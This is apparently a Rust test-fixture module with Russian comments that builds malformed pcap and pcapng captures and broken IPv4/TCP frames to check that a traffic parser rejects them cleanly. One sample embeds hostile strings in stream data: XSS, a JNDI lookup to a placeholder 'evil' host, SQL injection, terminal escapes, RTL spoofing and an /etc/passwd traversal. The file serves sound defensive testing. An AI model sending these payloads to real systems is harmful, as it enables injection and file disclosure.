//! Злые записи трафика: заведомо кривые файлы и пакеты (`plan/security.md` §7).
//! Каждый файл должен либо разбираться с диагностикой, либо отклоняться понятной ошибкой;
//! падение, зависание и гигантские выделения памяти — дефект разборщика.

#![allow(clippy::vec_init_then_push)] // перечень образцов читается лучше последовательностью push

use std::net::Ipv4Addr;

use pl_synth::capture::{Capture, Format};
use pl_synth::net::{self, Fragment, Host, TcpHeader, tcp_flags};

pub struct Sample {
    pub name: &'static str,
    pub extension: &'static str,
    pub what: &'static str,
    pub bytes: Vec<u8>,
}

fn sample(
    name: &'static str,
    extension: &'static str,
    what: &'static str,
    bytes: Vec<u8>,
) -> Sample {
    Sample {
        name,
        extension,
        what,
        bytes,
    }
}

const CLIENT: Host = Host {
    mac: [2, 0, 0, 0, 0, 10],
    ip: Ipv4Addr::new(10, 0, 0, 10),
};
const SERVER: Host = Host {
    mac: [2, 0, 0, 0, 1, 1],
    ip: Ipv4Addr::new(10, 0, 1, 1),
};

/// Корректный кадр Ethernet + IPv4 + TCP клиента на сервер.
pub fn tcp_frame(sport: u16, seq: u32, flags: u8, payload: &[u8]) -> Vec<u8> {
    tcp_frame_from(CLIENT.ip, sport, seq, flags, payload)
}

pub fn tcp_frame_from(src: Ipv4Addr, sport: u16, seq: u32, flags: u8, payload: &[u8]) -> Vec<u8> {
    let h = TcpHeader {
        src_port: sport,
        dst_port: 5020,
        seq,
        ack: 0,
        flags,
        window: 1000,
    };
    let segment = net::tcp(src, SERVER.ip, &h, payload, false);
    let ip = net::ipv4(
        src,
        SERVER.ip,
        net::IP_PROTO_TCP,
        1,
        Fragment::default(),
        &segment,
    );
    net::ethernet(SERVER.mac, CLIENT.mac, net::ETHERTYPE_IPV4, &ip)
}

fn pcapng_of(frames: &[Vec<u8>]) -> Vec<u8> {
    let mut cap = Capture::new(65535, 7);
    for f in frames {
        cap.push(f.clone());
    }
    cap.encode(Format::Pcapng)
}

/// Заголовок pcap (little-endian, микросекунды).
pub fn pcap_header(snaplen: u32, linktype: u32) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&0xA1B2_C3D4u32.to_le_bytes());
    out.extend_from_slice(&2u16.to_le_bytes());
    out.extend_from_slice(&4u16.to_le_bytes());
    out.extend_from_slice(&0i32.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&snaplen.to_le_bytes());
    out.extend_from_slice(&linktype.to_le_bytes());
    out
}

/// Запись pcap; `caplen` и `origlen` могут врать о длине `data`.
pub fn pcap_record(ts_sec: u32, caplen: u32, origlen: u32, data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&ts_sec.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&caplen.to_le_bytes());
    out.extend_from_slice(&origlen.to_le_bytes());
    out.extend_from_slice(data);
    out
}

fn pcap_honest(frames: &[Vec<u8>]) -> Vec<u8> {
    let mut out = pcap_header(65535, 1);
    for (i, f) in frames.iter().enumerate() {
        out.extend(pcap_record(
            1_790_812_800 + i as u32,
            f.len() as u32,
            f.len() as u32,
            f,
        ));
    }
    out
}

/// Блок pcapng; `declared` — длина, которую блок заявляет о себе (может врать).
pub fn pcapng_block(block_type: u32, body: &[u8], declared: Option<u32>) -> Vec<u8> {
    let real = (12 + body.len().div_ceil(4) * 4) as u32;
    let total = declared.unwrap_or(real);
    let mut out = Vec::new();
    out.extend_from_slice(&block_type.to_le_bytes());
    out.extend_from_slice(&total.to_le_bytes());
    out.extend_from_slice(body);
    out.resize(8 + body.len().div_ceil(4) * 4, 0);
    out.extend_from_slice(&total.to_le_bytes());
    out
}

fn shb() -> Vec<u8> {
    let mut body = Vec::new();
    body.extend_from_slice(&0x1A2B_3C4Du32.to_le_bytes());
    body.extend_from_slice(&1u16.to_le_bytes());
    body.extend_from_slice(&0u16.to_le_bytes());
    body.extend_from_slice(&(-1i64).to_le_bytes());
    pcapng_block(0x0A0D_0D0A, &body, None)
}

fn idb(linktype: u16) -> Vec<u8> {
    let mut body = Vec::new();
    body.extend_from_slice(&linktype.to_le_bytes());
    body.extend_from_slice(&0u16.to_le_bytes());
    body.extend_from_slice(&65535u32.to_le_bytes());
    pcapng_block(1, &body, None)
}

fn epb(data: &[u8]) -> Vec<u8> {
    let mut body = Vec::new();
    body.extend_from_slice(&0u32.to_le_bytes());
    body.extend_from_slice(&0u32.to_le_bytes());
    body.extend_from_slice(&1_000_000u32.to_le_bytes());
    body.extend_from_slice(&(data.len() as u32).to_le_bytes());
    body.extend_from_slice(&(data.len() as u32).to_le_bytes());
    body.extend_from_slice(data);
    pcapng_block(6, &body, None)
}

fn good_frames() -> Vec<Vec<u8>> {
    vec![
        tcp_frame(40000, 100, tcp_flags::SYN, &[]),
        tcp_frame(40000, 101, tcp_flags::PSH | tcp_flags::ACK, b"hello"),
        tcp_frame(40000, 106, tcp_flags::PSH | tcp_flags::ACK, b"world"),
    ]
}

/// Кадр с испорченным байтом: смещение от начала кадра Ethernet.
fn with_byte(mut frame: Vec<u8>, at: usize, value: u8) -> Vec<u8> {
    if let Some(b) = frame.get_mut(at) {
        *b = value;
    }
    frame
}

const IP_AT: usize = 14;
const TCP_AT: usize = 14 + 20;

/// Небольшие файлы: хранятся в `fixtures/hostile`.
pub fn samples() -> Vec<Sample> {
    let mut out = Vec::new();

    out.push(sample("empty", "pcap", "пустой файл", Vec::new()));
    out.push(sample(
        "text",
        "pcap",
        "обычный текст вместо записи",
        "это не запись трафика\n".repeat(20).into_bytes(),
    ));
    out.push(sample(
        "png-as-pcap",
        "pcap",
        "PNG под видом записи",
        b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec(),
    ));
    out.push(sample(
        "pcap-header-cut",
        "pcap",
        "заголовок pcap оборван на 10 байтах",
        pcap_header(65535, 1)[..10].to_vec(),
    ));
    out.push(sample(
        "pcap-no-packets",
        "pcap",
        "только заголовок pcap, пакетов нет",
        pcap_header(65535, 1),
    ));

    let mut cut = pcap_honest(&good_frames());
    cut.truncate(cut.len() - 7);
    out.push(sample(
        "pcap-last-record-cut",
        "pcap",
        "последняя запись обрезана посреди данных",
        cut,
    ));

    let mut huge = pcap_header(65535, 1);
    huge.extend(pcap_record(1, u32::MAX, u32::MAX, &[0u8; 40]));
    out.push(sample(
        "pcap-caplen-huge",
        "pcap",
        "запись заявляет длину 4 ГиБ, данных 40 байт",
        huge,
    ));

    let mut snap0 = pcap_header(0, 1);
    for (i, f) in good_frames().iter().enumerate() {
        snap0.extend(pcap_record(1 + i as u32, f.len() as u32, f.len() as u32, f));
    }
    out.push(sample(
        "pcap-snaplen-zero",
        "pcap",
        "snaplen = 0 при нормальных кадрах",
        snap0,
    ));

    let mut over = pcap_header(64, 1);
    let f = tcp_frame(40000, 100, tcp_flags::SYN, &[]);
    over.extend(pcap_record(1, 1500, 1500, &f));
    out.push(sample(
        "pcap-caplen-over-snaplen",
        "pcap",
        "длина записи больше snaplen и больше остатка файла",
        over,
    ));

    let mut zero_len = pcap_header(65535, 1);
    zero_len.extend(pcap_record(1, 0, 0, &[]));
    zero_len.extend(pcap_record(2, 0, 60, &[]));
    out.push(sample(
        "pcap-zero-length-frames",
        "pcap",
        "кадры нулевой длины",
        zero_len,
    ));

    out.push(sample(
        "pcap-unknown-linktype",
        "pcap",
        "канальный уровень 999 вместо Ethernet",
        {
            let mut v = pcap_header(65535, 999);
            for f in good_frames() {
                v.extend(pcap_record(1, f.len() as u32, f.len() as u32, &f));
            }
            v
        },
    ));

    let mut backwards = pcap_header(65535, 1);
    for (i, ts) in [4_000_000_000u32, 5, u32::MAX].iter().enumerate() {
        let f = tcp_frame(40000, 100 + i as u32, tcp_flags::ACK, &[]);
        backwards.extend(pcap_record(*ts, f.len() as u32, f.len() as u32, &f));
    }
    out.push(sample(
        "pcap-timestamps-wild",
        "pcap",
        "время идёт назад и доходит до границ u32",
        backwards,
    ));

    // pcapng
    let mut ng = shb();
    ng.extend(pcapng_block(6, &[0u8; 20], Some(0)));
    out.push(sample(
        "pcapng-block-length-zero",
        "pcapng",
        "блок заявляет длину 0",
        ng,
    ));

    let mut ng = shb();
    ng.extend(idb(1));
    ng.extend(pcapng_block(6, &[0u8; 20], Some(0xFFFF_FFF0)));
    out.push(sample(
        "pcapng-block-length-huge",
        "pcapng",
        "блок заявляет длину около 4 ГиБ",
        ng,
    ));

    let mut ng = shb();
    ng.extend(idb(1));
    ng.extend(pcapng_block(6, &[0u8; 20], Some(13)));
    out.push(sample(
        "pcapng-block-length-unaligned",
        "pcapng",
        "длина блока не кратна 4",
        ng,
    ));

    let mut ng = shb();
    for f in good_frames() {
        ng.extend(epb(&f));
    }
    out.push(sample(
        "pcapng-epb-without-idb",
        "pcapng",
        "пакеты без описания интерфейса",
        ng,
    ));

    let mut ng = shb();
    ng.extend(idb(999));
    for f in good_frames() {
        ng.extend(epb(&f));
    }
    out.push(sample(
        "pcapng-unknown-linktype",
        "pcapng",
        "интерфейс с канальным уровнем 999",
        ng,
    ));

    let mut ng = shb();
    ng.extend(idb(1));
    let f = &good_frames()[1];
    let mut body = Vec::new();
    for v in [0u32, 0, 1, 5000, 5000] {
        body.extend_from_slice(&v.to_le_bytes());
    }
    body.extend_from_slice(f);
    ng.extend(pcapng_block(6, &body, None));
    out.push(sample(
        "pcapng-captured-len-lies",
        "pcapng",
        "заявленная длина пакета больше самого блока",
        ng,
    ));

    let mut ng = shb();
    ng.extend(idb(1));
    ng.extend(epb(&good_frames()[0]));
    ng.extend_from_slice(&[0xDE, 0xAD, 0xBE]);
    out.push(sample(
        "pcapng-trailing-garbage",
        "pcapng",
        "мусор после последнего блока",
        ng,
    ));

    out.push(sample(
        "pcapng-two-shb",
        "pcapng",
        "вторая секция записи подряд",
        {
            let mut v = pcapng_of(&good_frames());
            v.extend(pcapng_of(&good_frames()));
            v
        },
    ));

    // Заголовки IPv4 и TCP
    let base = tcp_frame(40000, 100, tcp_flags::PSH | tcp_flags::ACK, b"hello");
    let frames = |bad: Vec<u8>| vec![good_frames()[0].clone(), bad];
    out.push(sample(
        "ipv4-ihl-1",
        "pcap",
        "длина заголовка IPv4 меньше 20 байт",
        pcap_honest(&frames(with_byte(base.clone(), IP_AT, 0x41))),
    ));
    out.push(sample(
        "ipv4-ihl-beyond-frame",
        "pcap",
        "длина заголовка IPv4 больше кадра",
        pcap_honest(&frames(with_byte(base.clone(), IP_AT, 0x4F))),
    ));
    out.push(sample(
        "ipv4-version-6-in-ipv4-frame",
        "pcap",
        "версия IP 6 в кадре с типом IPv4",
        pcap_honest(&frames(with_byte(base.clone(), IP_AT, 0x65))),
    ));
    let mut f = base.clone();
    f[IP_AT + 2] = 0;
    f[IP_AT + 3] = 10;
    out.push(sample(
        "ipv4-total-length-small",
        "pcap",
        "общая длина IPv4 меньше заголовка",
        pcap_honest(&frames(f)),
    ));
    let mut f = base.clone();
    f[IP_AT + 2] = 0xFF;
    f[IP_AT + 3] = 0xFF;
    out.push(sample(
        "ipv4-total-length-huge",
        "pcap",
        "общая длина IPv4 больше кадра",
        pcap_honest(&frames(f)),
    ));
    out.push(sample(
        "tcp-offset-2",
        "pcap",
        "смещение данных TCP меньше 5",
        pcap_honest(&frames(with_byte(base.clone(), TCP_AT + 12, 0x20))),
    ));
    out.push(sample(
        "tcp-offset-beyond-frame",
        "pcap",
        "смещение данных TCP за пределами кадра",
        pcap_honest(&frames(with_byte(base.clone(), TCP_AT + 12, 0xF0))),
    ));
    out.push(sample(
        "tcp-all-flags",
        "pcap",
        "все флаги TCP сразу, окно 0",
        pcap_honest(&frames(with_byte(base.clone(), TCP_AT + 13, 0xFF))),
    ));
    out.push(sample(
        "ethernet-runt",
        "pcap",
        "кадр короче заголовка Ethernet",
        pcap_honest(&[vec![1, 2, 3, 4, 5], base.clone()]),
    ));
    out.push(sample(
        "ethernet-truncated-ip",
        "pcap",
        "кадр обрывается внутри заголовка IPv4",
        pcap_honest(&[base[..24].to_vec(), base.clone()]),
    ));

    // Поведение TCP
    let isn = 1000u32;
    out.push(sample(
        "tcp-seq-jump-2gib",
        "pcap",
        "скачок seq ровно на 2^31: по RFC 9293 это «старые» данные, память под них не выделяется",
        pcap_honest(&[
            tcp_frame(40000, isn, tcp_flags::SYN, &[]),
            tcp_frame(40000, isn + 1, tcp_flags::PSH | tcp_flags::ACK, b"first"),
            tcp_frame(
                40000,
                isn.wrapping_add(1 + (1 << 31)),
                tcp_flags::PSH | tcp_flags::ACK,
                b"second",
            ),
            tcp_frame(
                40000,
                isn.wrapping_add(1 + (1 << 31)) + 6,
                tcp_flags::PSH | tcp_flags::ACK,
                b"third",
            ),
        ]),
    ));
    out.push(sample(
        "tcp-seq-jump-1gib",
        "pcap",
        "скачок seq на 2^30: дыра в гигабайт — метаданные, а не байты",
        pcap_honest(&[
            tcp_frame(40000, isn, tcp_flags::SYN, &[]),
            tcp_frame(40000, isn + 1, tcp_flags::PSH | tcp_flags::ACK, b"first"),
            tcp_frame(
                40000,
                isn.wrapping_add(1 + (1 << 30)),
                tcp_flags::PSH | tcp_flags::ACK,
                b"second",
            ),
        ]),
    ));
    out.push(sample(
        "tcp-seq-wrap",
        "pcap",
        "seq переходит через 2^32 посреди потока",
        pcap_honest(&[
            tcp_frame(40000, u32::MAX - 6, tcp_flags::SYN, &[]),
            tcp_frame(
                40000,
                u32::MAX - 5,
                tcp_flags::PSH | tcp_flags::ACK,
                b"before",
            ),
            tcp_frame(40000, 0, tcp_flags::PSH | tcp_flags::ACK, b"after"),
        ]),
    ));
    let storm: Vec<Vec<u8>> = std::iter::once(tcp_frame(40000, 0, tcp_flags::SYN, &[]))
        .chain(
            (0..3000u32)
                .map(|i| tcp_frame(40000, 1 + i % 40, tcp_flags::ACK, &[(i % 251) as u8; 64])),
        )
        .collect();
    out.push(sample(
        "tcp-overlap-storm",
        "pcap",
        "три тысячи перекрывающихся сегментов с разными байтами",
        pcap_honest(&storm),
    ));
    let syns: Vec<Vec<u8>> = (0..1000u16)
        .map(|i| tcp_frame(10_000 + i, 1, tcp_flags::SYN, &[]))
        .collect();
    out.push(sample(
        "tcp-many-connections",
        "pcap",
        "тысяча соединений из одного SYN",
        pcap_honest(&syns),
    ));
    out.push(sample(
        "tcp-data-after-rst",
        "pcap",
        "данные после RST и повторный SYN с тем же seq",
        pcap_honest(&[
            tcp_frame(40000, 100, tcp_flags::SYN, &[]),
            tcp_frame(40000, 101, tcp_flags::RST | tcp_flags::ACK, &[]),
            tcp_frame(40000, 101, tcp_flags::PSH | tcp_flags::ACK, b"zombie"),
            tcp_frame(40000, 100, tcp_flags::SYN, &[]),
        ]),
    ));

    // Содержимое: строки, опасные для интерфейса и отчётов
    let nasty: &[&[u8]] = &[
        b"<script>alert(document.cookie)</script>",
        b"\"><img src=x onerror=alert(1)>",
        b"javascript:alert(1)//",
        b"{{7*7}} ${jndi:ldap://evil/a} %s%n%x",
        "\u{202e}gnp.exe\u{202d} \u{200b}\u{feff}".as_bytes(),
        b"\x1b[2J\x1b]0;pwned\x07\x00\x00\x00",
        b"'; DROP TABLE users; --",
        b"../../../../etc/passwd\0.pcap",
    ];
    let mut payload_frames = vec![tcp_frame(40000, 0, tcp_flags::SYN, &[])];
    let mut seq = 1u32;
    for p in nasty {
        payload_frames.push(tcp_frame(40000, seq, tcp_flags::PSH | tcp_flags::ACK, p));
        seq += p.len() as u32;
    }
    payload_frames.push(tcp_frame(
        40000,
        seq,
        tcp_flags::PSH | tcp_flags::ACK,
        &[b'A'; 9000],
    ));
    out.push(sample(
        "payload-hostile-strings",
        "pcap",
        "HTML, JS, управляющие символы и RTL в данных потока: везде показывать как текст",
        pcap_honest(&payload_frames),
    ));

    out
}

/// Крупные записи: создаются в тестах, в репозиторий не кладутся.
pub fn large(name: &str) -> Option<Vec<u8>> {
    match name {
        // Больше предела соединений (100 тысяч).
        "connections-over-limit" => {
            let mut out = pcap_header(65535, 1);
            for i in 0..100_001u32 {
                // Разные узлы и порты клиента дают разные 4-кортежи.
                let src = Ipv4Addr::from(0x0A00_0000u32 + 1 + i / 60_000);
                let f = tcp_frame_from(src, 1024 + (i % 60_000) as u16, 1, tcp_flags::SYN, &[]);
                out.extend(pcap_record(1, f.len() as u32, f.len() as u32, &f));
            }
            Some(out)
        }
        // Сто тысяч сегментов по одному байту в одном потоке.
        "tiny-segments" => {
            let mut frames = vec![tcp_frame(40000, 0, tcp_flags::SYN, &[])];
            frames.extend(
                (0..100_000u32)
                    .map(|i| tcp_frame(40000, 1 + i, tcp_flags::ACK, &[(i % 251) as u8])),
            );
            Some(pcap_honest(&frames))
        }
        _ => None,
    }
}

pub const LARGE: &[&str] = &["connections-over-limit", "tiny-segments"];
